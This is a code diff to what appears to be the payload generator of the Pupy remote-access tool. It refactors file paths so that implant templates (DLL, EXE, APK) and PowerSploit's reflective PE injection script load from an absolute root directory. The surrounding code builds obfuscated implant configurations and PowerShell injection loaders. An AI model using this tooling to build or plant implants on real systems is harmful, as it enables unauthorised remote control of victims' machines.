@@ -16,18 +16,19 @@ import scriptlets
 import cPickle
 import base64
 
+ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))
 
 def get_edit_pupyx86_dll(conf):
-    return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), conf)
+    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.dll"), conf)
 
 def get_edit_pupyx64_dll(conf):
-    return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), conf)
+    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.dll"), conf)
 
 def get_edit_pupyx86_exe(conf):
-    return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), conf)
+    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.exe"), conf)
 
 def get_edit_pupyx64_exe(conf):
-    return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), conf)
+    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.exe"), conf)
 
 def get_edit_binary(path, conf):
     logging.debug("generating binary %s with conf: %s"%(path, conf))
@@ -104,7 +105,6 @@ def get_raw_conf(conf, obfuscate=False):
 
     #pack custom transport conf:
     l.get_transport()
-    ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))
     transport_conf_dic=gen_package_pickled_dic(ROOT+os.sep, "network.transports.%s"%l.get_transport())
     #add custom transport and reload network conf
     new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(transport_conf_dic)))+"\nimport sys\nsys.modules.pop('network.conf')\nimport network.conf\n"
@@ -345,7 +345,7 @@ if __name__=="__main__":
     elif args.format=="apk":
         if not outpath:
             outpath="pupy.apk"
-        get_edit_apk(os.path.join("payload_templates","pupy.apk"), outpath, conf)
+        get_edit_apk(os.path.join(ROOT, "payload_templates","pupy.apk"), outpath, conf)
     elif args.format=="py" or args.format=="pyinst":
         linux_modules = ""
         if not outpath:
@@ -389,7 +389,7 @@ if __name__=="__main__":
             x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
             x64ConcatCode += "$PEBytes{0}+".format(i)
         print(colorize("[+] ","green")+"X64 dll loaded and {0} variables used".format(i+1))
-        script = open(os.path.join("external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
+        script = open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
         with open(outpath, 'wb') as w:
             w.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
     elif args.format=="ps1_oneliner":
